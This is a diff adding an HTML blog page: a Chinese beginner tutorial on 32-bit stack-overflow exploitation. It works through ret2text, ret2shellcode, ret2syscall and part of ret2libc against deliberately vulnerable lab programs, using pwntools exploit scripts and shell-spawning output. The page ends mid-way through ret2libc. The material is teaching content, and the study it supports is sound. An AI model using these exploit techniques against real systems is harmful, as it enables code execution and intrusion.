@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="栈溢出漏洞利用入门，涵盖ret2text、ret2shellcode、ret2syscall和ret2libc四种攻击方式。通过32位环境示例，讲解原理、计算填充长度、控制返回地址、构造ROP链及泄露libc地址的方法，帮助读者掌握PWN基础攻击技术。">
+  <title>122:PWN(1)</title>
+  <script>
+    if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+      document.documentElement.classList.add('is-page-transition-preload');
+    }
+  </script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Noto+Sans+SC:wght@400;500;600&family=Noto+Serif+SC:wght@400;500;600&family=Source+Sans+3:wght@400;500;600&family=Source+Serif+4:opsz,wght@8..60,400..700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.22/dist/katex.min.css">
+  <link rel="stylesheet" href="../../assets/site.css">
+</head>
+
+<body>
+  <div class="reading-progress" data-reading-progress aria-hidden="true"></div>
+  <div class="layout">
+    <div class="layout__scene">
+      <main class="layout__main">
+        <section class="layout__content">
+          <header class="header">
+  <div class="header__utility">
+    <p class="header__eyebrow">122:PWN(1)</p>
+    <button class="edition-toggle" type="button" data-theme-toggle aria-label="切换至黑夜模式">
+      <span class="edition-toggle__options" aria-hidden="true">
+        <span data-theme-option="light">Day</span>
+        <span data-theme-option="dark">Night</span>
+      </span>
+    </button>
+  </div>
+  <div class="header__line">
+    <h1 class="header__title">122:PWN(1)</h1>
+    <div class="header__tools">
+      <nav class="header__nav" aria-label="导航">
+        
+          <a class="header__nav-link header__nav-link--active" href="../../index.html">index</a>
+        
+          <a class="header__nav-link" href="../../tags/index.html">tags</a>
+        
+          <a class="header__nav-link" href="../../categories/index.html">categories</a>
+        
+          <a class="header__nav-link" href="../../about/index.html">about</a>
+        
+      </nav>
+      <form class="header-search" role="search" data-search-form data-search-index="../../search.json">
+        <input class="header-search__input" type="search" autocomplete="off" aria-label="搜索标题、标签或分类" placeholder="search..." data-search-input>
+        <div class="header-search__panel" data-search-panel>
+          <p class="header-search__status" data-search-status></p>
+          <ul class="header-search__results" data-search-results></ul>
+        </div>
+      </form>
+    </div>
+  </div>
+</header>
+
+          <article class="layout__article markdown-content">
+
+  
+    <div class="post-meta">
+      
+        
+          <span class="post-meta__item post-meta__item--date">2026-03-29</span>
+        
+      
+        
+          <a class="post-meta__item post-meta__item--category" href="../../categories/index.html#category-计算机安全">计算机安全</a>
+        
+      
+        
+          <a class="post-meta__item post-meta__item--category" href="../../categories/index.html#category-计算机安全-栈">栈</a>
+        
+      
+        
+          <a class="post-meta__item post-meta__item--tag" href="../../tags/index.html#tag-c">#C</a>
+        
+      
+    </div>
+  
+
+
+  <p>上一篇中讲了学习PWN之前，讲了一些需要知道的基本原理。现在开始真实的还原并解析这些过程：</p>
+<h2 id="栈溢出-上">栈溢出(上)</h2>
+<blockquote>
+<p>以下示例均为32位环境且没有开启no-pie，64位需要参考x86-64的ABI</p>
+</blockquote>
+<h3 id="栈溢出的原理">栈溢出的原理</h3>
+<blockquote>
+<p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，我们可以使用它让程序崩溃，也可以控制程序的执行流程。综上我们也可以整理出发生栈溢出的基本前提：</p>
+<ul>
+<li>程序必须向栈上写入数据。</li>
+<li>写入的数据大小没有被良好地控制。</li>
+</ul>
+</blockquote>
+<p>结合一个示例来看看，我们的目标是通过栈溢出控制执行<code>success</code>函数：</p>
+<pre class="code-block language-c" data-language="C"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">success</span><span class="hljs-params">()</span>{
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You did it!\n&quot;</span>);
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span>{
+    <span class="hljs-type">char</span> s[<span class="hljs-number">10</span>];	
+    gets(s);		<span class="hljs-comment">// 栈溢出入口点</span>
+    <span class="hljs-built_in">puts</span>(s);
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>{
+    vuln();
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>使用<code>gcc -m32 -fno-stack-protector -Wno-implicit-function-declaration test.c -o stack</code>进行编译后，我们用checksec来检查开启的保护机制：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">&gt; pwn checksec ./stack
+[*] <span class="hljs-string">&#x27;/home/Ylin/PWN/stack&#x27;</span>
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+</code></pre>
+<p>我们可以通过ida来查看这一部分的栈结构，分析结构后构造ROP执行攻击。栈布局如下：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">-00000012 s               db ?           ; 缓冲区开始
+-00000011                 db ?
+-00000010                 db ?
+-0000000F                 db ?
+-0000000E                 db ?
+-0000000D                 db ?
+-0000000C                 db ?
+-0000000B                 db ?
+-0000000A                 db ?
+-00000009                 db ?
+-00000008                 db ?
+-00000007                 db ?
+-00000006                 db ?
+-00000005                 db ?
+-00000004 var_4           <span class="hljs-built_in">dd</span> ?           ; 4字节变量
++00000000  s              db 4 dup(?)    ; 保存的EBP
++00000004  r              db 4 dup(?)    ; 返回地址
+</code></pre>
+<p>在gdb中可以看到栈布局：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">00:0000│ esp   0xffffcc60 —▸ 0xffffcc76 ◂— <span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaa&#x27;</span>
+01:0004│-024   0xffffcc64 ◂— 0
+02:0008│-020   0xffffcc68 ◂— 0xffffffff
+03:000c│-01c   0xffffcc6c —▸ 0x565561d4 (vuln+12) ◂— add ebx, 0x2e20
+04:0010│-018   0xffffcc70 —▸ 0xf7fbf400 —▸ 0xf7d7c000 ◂— 0x464c457f
+05:0014│ eax-2 0xffffcc74 ◂— 0x61610000
+06:0018│-010   0xffffcc78 ◂— <span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaa&#x27;</span>
+... ↓          3 skipped
+0a:0028│ ebp   0xffffcc88 ◂— <span class="hljs-string">&#x27;aaaa&#x27;</span>
+0b:002c│+004   0xffffcc8c —▸ 0x56556200 (main+2) ◂— <span class="hljs-keyword">in</span> eax, 0x83
+</code></pre>
+<p>结合动态运行的栈和上面静态分析的栈结构，我们就可以得到程序内部的栈结构状态：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">                                           +-----------------+
+                                           |     retaddr     |
+                                    ret---&gt;+-----------------+ --&gt; +4
+                                           |     saved ebp   |
+                                    ebp---&gt;+-----------------+ --&gt; 0
+                                           |                 |
+                                           |     buffer      |
+                                           |                 |
+                                    buf---&gt;+-----------------+ --&gt; -12
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                                     esp--&gt;+-----------------+
+</code></pre>
+<p>我们想要控制返回地址，就需要利用栈溢出覆盖<code>buffer+saved ebp</code>(这里22个字节)，然后再用四个字节覆盖返回地址，使得程序退出时跳转到你希望的执行流上面。计算<code>offset = |buf起始负偏移| + |ret起始正偏移|</code></p>
+<p>现在我们可以写出攻击脚本exp：（<a href="https://docs.pwntools.com/en/stable/">pwntools官方文档</a>）</p>
+<pre class="code-block language-python" data-language="PYTHON"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * 
+
+sh = process(<span class="hljs-string">&quot;./stack&quot;</span>)
+success_addr = <span class="hljs-number">0x8049176</span>
+<span class="hljs-comment"># pwntools的使用和payload的构造自己查看官方文档</span>
+payload = <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">22</span> + p32(success_addr)	
+
+sh.sendline(payload)
+sh.interactive()
+</code></pre>
+<p>最终得到执行结果：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">[14:54:40] Ylin@Ylin /home/Ylin/PWN
+&gt; python3 exp.py
+[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./stack&#x27;</span>: pid 5957
+[*] Switching to interactive mode
+aaaaaaaaaaaaaaaaaaaaaav\x91\x04\x08
+You did it!
+[*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactive
+$ q
+[*] Process <span class="hljs-string">&#x27;./stack&#x27;</span> stopped with <span class="hljs-built_in">exit</span> code -11 (SIGSEGV) (pid 5957)
+[*] Got EOF <span class="hljs-keyword">while</span> sending <span class="hljs-keyword">in</span> interactive
+</code></pre>
+<p>这样就是一次完整的栈溢出攻击过程。总之，利用栈溢出的流程就是：</p>
+<ul>
+<li>寻找危险函数</li>
+<li>计算填充长度</li>
+<li>控制返回地址</li>
+</ul>
+<p>现在我们学会了怎么利用栈溢出控制返回地址，但也仅仅只是学会了控制返回地址。接下来我们需要掌握怎么进一步的去拿到<code>shell</code>或是我们需要的内容。</p>
+<h3 id="ret2text">ret2text</h3>
+<p>ret2text 即控制程序执行程序本身已有的的代码 (即， <code>.text</code> 段中的代码) 。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这是我们之后要说的 ROP。</p>
+<p>现在我们拿到一个程序（和上一个的区别只在<code>success</code>）:</p>
+<pre class="code-block language-c" data-language="C"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">success</span><span class="hljs-params">()</span>{
+    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span>{
+    <span class="hljs-type">char</span> s[<span class="hljs-number">10</span>];
+    gets(s);
+    <span class="hljs-built_in">puts</span>(s);
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>{
+    vuln();
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>我们就可以利用它的代码段中的<code>system(&quot;/bin/sh&quot;)</code>来构造出我们想要的payload:</p>
+<pre class="code-block language-py" data-language="PY"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *  
+sh = process(<span class="hljs-string">&quot;./ret2text&quot;</span>)
+target = <span class="hljs-number">0x8049186</span>
+payload = <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">22</span> + p32(target)
+sh.sendline(payload)
+sh.interactive()
+</code></pre>
+<p>执行脚本，从而拿到shell的权限，我们就可以进一步的读取里面的信息了，如<code>cat flag</code>：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">&gt; python3 exp.py
+[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./ret2text&#x27;</span>: pid 14942
+[*] Switching to interactive mode
+aaaaaaaaaaaaaaaaaaaaaa\x86\x91\x04\x08
+$ <span class="hljs-built_in">ls</span>
+exp.py       ret2text      ret2text.id1  ret2text.nam  test.c
+ida-mcp-env  ret2text.id0  ret2text.id2  ret2text.til
+</code></pre>
+<h3 id="ret2shellcode">ret2shellcode</h3>
+<p>大多数时候，程序中并没有现有的<code>system(&quot;\bin\sh&quot;)</code>给我们使用，这使得我们需要自己构造shellcode，shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。</p>
+<p>当程序存在缓冲区溢出，且栈（或其他内存区域）具有可执行权限时，攻击者可以：</p>
+<ol>
+<li>在内存中写入 shellcode（通常通过输入缓冲区，也可以bss段）</li>
+<li>覆盖返回地址为 shellcode 的起始地址</li>
+<li>函数返回时跳转到 shellcode，执行任意代码</li>
+</ol>
+<p>我们以下面的程序为例：</p>
+<pre class="code-block language-c" data-language="C"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span> {
+    <span class="hljs-type">char</span> buf[<span class="hljs-number">64</span>];
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;buf: %p\n&quot;</span>, buf);	<span class="hljs-comment">// 为了方便找到buf的地址，否则要绕过ASLR很麻烦</span>
+    gets(buf); 
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
+    vuln();
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>通过<code>gcc -m32 -fno-stack-protector -Wno-implicit-function-declaration -z execstack test.c -o ret2shellcode</code> 编译后检查保护机制：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">&gt; pwn checksec ret2shellcode
+[*] <span class="hljs-string">&#x27;/home/Ylin/PWN/ret2shellcode&#x27;</span>
+    Arch:       amd64-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE (0x400000)
+    Stack:      Executable
+    RWX:        Has RWX segments
+    Stripped:   No
+</code></pre>
+<p>我们可以看到<code>NX</code>保护被关闭了，且栈是可以执行的。所以我们就可以向栈上先填充padding（填充值）和shellcode，然后将返回地址覆盖为缓冲区的起始地址，从而控制程序执行我们的shellcode，以获得shell权限。</p>
+<p>我们分析程序的栈结构来构造我们的攻击脚本：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">-00000048 s               db 68 dup(?)
+-00000004 var_4           <span class="hljs-built_in">dd</span> ?
++00000000  s              db 4 dup(?)
++00000004  r              db 4 dup(?)
+</code></pre>
+<p>计算出<code>offset = 0x48 + 0x4</code>，同时可以通过输出来确定<code>buf</code>的入口地址作为我们的返回地址，然后我们可以利用<code>pwntools</code>自带的shellcode生成，写出<code>exp</code>：</p>
+<pre class="code-block language-py" data-language="PY"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-py"><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+sh = process(<span class="hljs-string">&quot;./ret2shellcode&quot;</span>)
+shellcode = asm(shellcraft.sh())
+
+offset = <span class="hljs-number">0x48</span> + <span class="hljs-number">4</span>
+<span class="hljs-comment"># 用来读取buf地址</span>
+buf_addr = <span class="hljs-built_in">int</span>(sh.recv().decode().split()[-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)
+
+<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Buffer address: <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(buf_addr)}</span>&quot;</span>)
+<span class="hljs-comment"># shellcode左对齐，保证可以覆盖缓冲区和rbp</span>
+payload = shellcode.ljust(offset, <span class="hljs-string">b&#x27;A&#x27;</span>) + p32(buf_addr)
+
+sh.sendline(payload)
+sh.interactive()
+</code></pre>
+<p>最终成功执行得到shell:</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">[17:07:50] Ylin@Ylin /home/Ylin/PWN
+&gt; python3 exp.py
+[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>: pid 31376
+Buffer address: 0xffbf39d0
+[*] Switching to interactive mode
+$ <span class="hljs-built_in">ls</span>
+exp.py  ida-mcp-env  ret2shellcode  test.c
+</code></pre>
+<h3 id="ret2syscall">ret2syscall</h3>
+<p>ret2syscall，即控制程序执行系统调用，获取 shell。但是在讲这个之前我们需要先了解一下什么是ROP和gadget。</p>
+<p>ROP是一种高级漏洞利用技术，用于绕过 NX 保护机制。当栈不可执行时，无法直接执行 shellcode，ROP 通过复用程序中已有的代码片段来构造恶意逻辑。就是虽然在某些时候我们无法注入shellcode并控制返回执行，但是我们可以控制返回去执行一些代码片段(即跳到某条地址执行指令)，但是并不是所有的指令都是有意义的，我们把可以利用的指令称为<code>gadget</code>。</p>
+<p>一个合格的gadget需要满足以下两个要求：</p>
+<ul>
+<li>要有&quot;副作用&quot;，就是这个指令要能够修改寄存器/内存，或是进行计算。以促进我们达成某种目的</li>
+<li>要以控制流结束结尾，我们要确保gadget能从一个跳转到下一个，所以就需要<code>ret</code>结尾来控制控制流</li>
+</ul>
+<p>最常见的使用gadget构造rop的方法就是在<code>ret2syscall</code>中，我们可以通过向寄存器传递对应的参数后通过<code>int 80</code>来进行系统调用：</p>
+<ul>
+<li><code>eax</code>: 传递系统调用号</li>
+<li><code>ebx ecx edx esi edi</code> ：第1-5个参数</li>
+<li><code>int 0x80</code>：触发系统调用，常用的有<code>write</code>、<code>execve</code>、<code>open</code>、<code>read</code>、…</li>
+</ul>
+<p>我们以下面的程序来演示，我手动放了我们需要gadget进去来模拟实际的场景：</p>
+<pre class="code-block language-c" data-language="C"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
+
+<span class="hljs-type">char</span> *str = <span class="hljs-string">&quot;/bin/sh&quot;</span>;
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">gadget</span><span class="hljs-params">()</span>{
+    __asm__ <span class="hljs-title function_">volatile</span><span class="hljs-params">(
+        <span class="hljs-string">&quot;pop %eax;ret;&quot;</span>
+        <span class="hljs-string">&quot;pop %ebx;ret;&quot;</span>
+        <span class="hljs-string">&quot;pop %ecx;ret;&quot;</span>
+        <span class="hljs-string">&quot;pop %edx;ret;&quot;</span>
+        <span class="hljs-string">&quot;int $0x80;&quot;</span>
+    )</span>;
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span> {
+    <span class="hljs-type">char</span> buf[<span class="hljs-number">64</span>];
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;buf: %p\n&quot;</span>, buf);
+    gets(buf); 
+    write(<span class="hljs-number">1</span>,buf,<span class="hljs-built_in">strlen</span>(buf));
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
+    vuln();
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>通过<code>gcc -m32 -fno-stack-protector -Wno-implicit-function-declaration -no-pie test.c -o ret2syscall -O0</code>编译得到我们要攻击的程序，检查保护机制，发现开了<code>NX enable</code>：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">&gt; pwn checksec ret2syscall
+[*] <span class="hljs-string">&#x27;/home/Ylin/PWN/ret2syscall&#x27;</span>
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+</code></pre>
+<p>此时程序中既没有可以直接使用的后门函数，也没有可以执行的栈，我们只能收集gadget来构造ROP:（这一步也可以用ida完成）</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">&gt; ROPgadget --binary ret2syscall --only <span class="hljs-string">&quot;pop|ret|int&quot;</span>
+Gadgets information
+============================================================
+0x080491ab : int 0x80
+0x080491a3 : pop eax ; ret
+0x080491ae : pop ebp ; ret
+0x0804901e : pop ebx ; ret
+0x080491a7 : pop ecx ; ret
+0x080491a9 : pop edx ; ret
+0x0804900a : ret
+0x0804912b : ret 0xe8c1
+
+Unique gadgets found: 8
+
+&gt; ROPgadget --binary ret2syscall --string <span class="hljs-string">&quot;/bin/sh&quot;</span>
+Strings information
+============================================================
+0x0804a008 : /bin/sh
+</code></pre>
+<p>由于这里给了字符串<code>/bin/sh</code>，所以我们自然会想到利用<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code>来获得shell的权限，于是我们可以设计出ROP：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">pop_eax_ret + 11 + pop_ebx_ret + /bin/sh + pop_ecx_ret + 0 + pop_edx_ret + 0 + int_80
+</code></pre>
+<p>通过将ROP放在缓冲区的入口，控制程序的执行流来执行系统调用。可以注意到每个<code>pop_ret</code>实际上会弹出两次栈上的数据，第一次将栈上的数据弹出作为参数，第二次ret弹出下一个数据作为执行的地址，这个执行流的控制一定要搞清楚，因为很多时候收集到的<code>gadget</code>并不会这么典型，可能会有<code>pop_eax_pop_ebx_pop_ecx_ret</code>这种的，这个时候ROP的构造就要视情况而定。</p>
+<p>最终针对上面的程序，我们可以写出exp:</p>
+<pre class="code-block language-py" data-language="PY"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-py"><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+sh = process(<span class="hljs-string">&quot;./ret2syscall&quot;</span>)
+
+offset = <span class="hljs-number">0x48</span> + <span class="hljs-number">0x4</span>
+
+int80 = <span class="hljs-number">0x080491ab</span>
+pop_eax_ret = <span class="hljs-number">0x080491a3</span>
+pop_ebx_ret = <span class="hljs-number">0x0804901e</span> 
+pop_ecx_ret = <span class="hljs-number">0x080491a7</span>
+pop_edx_ret = <span class="hljs-number">0x080491a9</span>
+bin_sh = <span class="hljs-number">0x0804a008</span>
+
+ROP = flat([pop_eax_ret, 
+            <span class="hljs-number">0xb</span>, 
+            pop_ebx_ret, 
+            bin_sh, 
+            pop_ecx_ret, 
+            <span class="hljs-number">0</span>, 
+            pop_edx_ret, 
+            <span class="hljs-number">0</span>, 
+            int80])
+
+<span class="hljs-comment"># 这里直接用ROP的入口覆盖ret值即可，相当于利用栈上的“地址序列”去串联现有代码片段执行</span>
+<span class="hljs-comment"># NX 只禁止前者，不禁止后者。</span>
+payload = <span class="hljs-string">b&quot;A&quot;</span> * offset + ROP
+
+sh.sendline(payload)
+sh.interactive()
+</code></pre>
+<p>最终执行得到：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">&gt; python3 exp.py
+[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./ret2syscall&#x27;</span>: pid 24179
+[*] Switching to interactive mode
+buf: 0xffa81f70
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa3\x91\x04\x08\x0b$ <span class="hljs-built_in">ls</span>
+exp.py       ret2syscall      ret2syscall.id1  ret2syscall.nam  test.c
+ida-mcp-env  ret2syscall.id0  ret2syscall.id2  ret2syscall.til
+</code></pre>
+<h3 id="ret2libc">ret2libc</h3>
+<p>假如现在我们连合适的<code>gadget</code>都收集不到了怎么办。这个时候我们就可以通过利用内存中libc的库的标准函数来获取我们想要的内容。前提是程序需要是动态链接的，这里简单解释一下，当程序动态链接时，操作系统会将libc加载到内存中，这个时候我们的程序需要调用标准函数时，就会跳转到libc中执行。而我们就可以利用这一点，直接将返回值改为libc中我们想执行的函数。而ret2libc的关键，就在于我们怎么得到想要执行的libc的函数。</p>
+<p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
+<p>现在我们不得不面对一个问题，在现代的环境中<code>ASLR</code>通常是默认开启的。<code>libc</code>并不会加载在固定的地址，所以我们首先需要泄露出libc的基址。然后再用基址加上libc内的固定偏移来获取我们要调用的地址。一般情况下我们会这么做：</p>
+<ul>
+<li>泄露某个标准函数的<code>libc</code>地址<code>func_addr</code>，然后确定对应的libc版本</li>
+<li>由于所有函数的偏移值<code>offset</code>在libc中是已知的，我们就可以求出libc的基址<code>libc_base = func_addr - offset</code></li>
+<li>拿到基址，又知道其他函数的偏移值，我们就可以获得想要的函数的地址<code>system_addr = libc_base + system_offset</code></li>
+</ul>
+<p>接下来的流程就和ret2text是一样的了。但是关键的难点就在于怎么泄露标准函数的地址。一般我们可以通过：</p>
+<ul>
+<li>输出函数<code>printf</code>、<code>puts</code>、<code>write</code>等泄露GOT（这个是等下要用的手法）</li>
+<li>格式化字符串漏洞，这个下次再讲</li>
+<li>栈残留数据泄露，有时候函数地址会作为参数和返回地址残留在栈上</li>
+</ul>
+<p>以下程序为例，演示ret2libc的过程：</p>
+<pre class="code-block language-c" data-language="C"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span> {
+    <span class="hljs-type">char</span> buf[<span class="hljs-number">64</span>];
+    gets(buf); 
+    <span class="hljs-built_in">puts</span>(buf);
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
+    vuln();
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>我们用<code>gcc -m32 -fno-stack-protector -Wno-implicit-function-declaration -no-pie test.c -o ret2libc -O0</code>编译，并检查保护机制：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">&gt; pwn checksec ret2libc
+[*] <span class="hljs-string">&#x27;/home/Ylin/PWN/ret2libc&#x27;</span>
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+</code></pre>
+<p>由于程序很短，我们也自然收集不到合适的<code>gadget</code>来构造rop。所以我们只能先利用程序中的puts函数先泄露几个地址，这里我们用puts泄露本身的地址就够用了：</p>
+<pre class="code-block language-py" data-language="PY"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-py"><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+sh = process(<span class="hljs-string">&quot;./ret2libc&quot;</span>)
+elf = ELF(<span class="hljs-string">&quot;./ret2libc&quot;</span>)
+
+put_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]
+puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]
+main_addr = elf.symbols[<span class="hljs-string">&quot;main&quot;</span>]
+
+offset = <span class="hljs-number">0x48</span> + <span class="hljs-number">0x4</span>
+payload1 = <span class="hljs-string">b&quot;A&quot;</span> * offset 
+<span class="hljs-comment"># 这里的顺序是 跳转到call puts + 返回地址 + put的第一个参数</span>
+<span class="hljs-comment"># 解释一下为什么返回main, 因为接下来还需要再利用一次栈溢出, 回到main恢复状态</span>
+<span class="hljs-comment"># puts_got在经过延迟绑定后存放的是puts的真实地址</span>
+<span class="hljs-comment"># 不知道什么是plt 和 got的自己去搜</span>
+payload1 += p32(put_plt) + p32(main_addr) + p32(puts_got)
+sh.sendline(payload1)
+
+<span class="hljs-comment"># echo 一般是用来消耗无用的返回</span>
+echo = sh.recvline()
+<span class="hljs-comment"># 将返回的输出转换成32位的标准</span>
+puts_addr = u32(sh.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>)[:<span class="hljs-number">4</span>].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))
+
+log.success(<span class="hljs-string">f&quot;puts addr: <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(puts_addr)}</span>&quot;</span>)
+</code></pre>
+<p>有了puts的真实地址后，接下来需要解决的问题就是需要知道libc版本，以确定puts在libc中的相对偏移，求出libc基址。到现在为止一般有两种情况：</p>
+<ul>
+<li>已知libc版本，有时候题目会直接给，直接<code>libc = ELF(&quot;libc.so.6&quot;)</code>就行了</li>
+<li>未知libc版本，通常利用工具来查询，接下来我会演示两种方法</li>
+</ul>
+<p>一种是通过在线网站<a href="https://libc.blukat.me/">https://libc.blukat.me/</a> 输入对应的函数和泄露出来的地址，来查询libc版本：</p>
